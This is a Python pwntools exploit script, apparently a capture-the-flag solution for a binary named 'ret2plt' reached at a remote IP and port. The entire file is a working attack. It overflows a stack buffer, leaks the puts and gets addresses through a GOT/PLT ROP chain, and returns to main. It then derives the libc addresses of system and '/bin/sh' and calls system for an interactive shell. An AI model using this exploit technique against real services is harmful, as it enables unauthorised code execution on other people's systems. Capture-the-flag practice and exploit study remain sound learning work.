#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./ret2plt"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2125)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''

    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'


    
pop_rdi = p64(0x00000000004006f3) # pop rdi ; ret

rbp = 0x0

p = b'a' * 0x20 + p64(rbp)

# leak put
p += pop_rdi
p += p64(elf.got['puts'])
p += p64(elf.plt['puts'])

p += pop_rdi
p += p64(elf.got['gets'])
p += p64(elf.plt['puts'])

p += p64(0x400637) # main again

c.sendlineafter(':', p)

leak = c.recvuntil('best').split()[2:4]
print(leak)
puts_addr = u64(leak[0] + b'\0\0')
gets_addr = u64(leak[1] + b'\0\0')
print(hex(puts_addr), hex(gets_addr))


system_addr = puts_addr - 0x2a300
str_bin_sh = system_addr + 0x147a77

p = b'a' * 0x20 + p64(rbp)

# call system
p += pop_rdi
p += p64(str_bin_sh)
p += p64(system_addr)


c.sendlineafter(':', p)

c.interactive()
c.close()


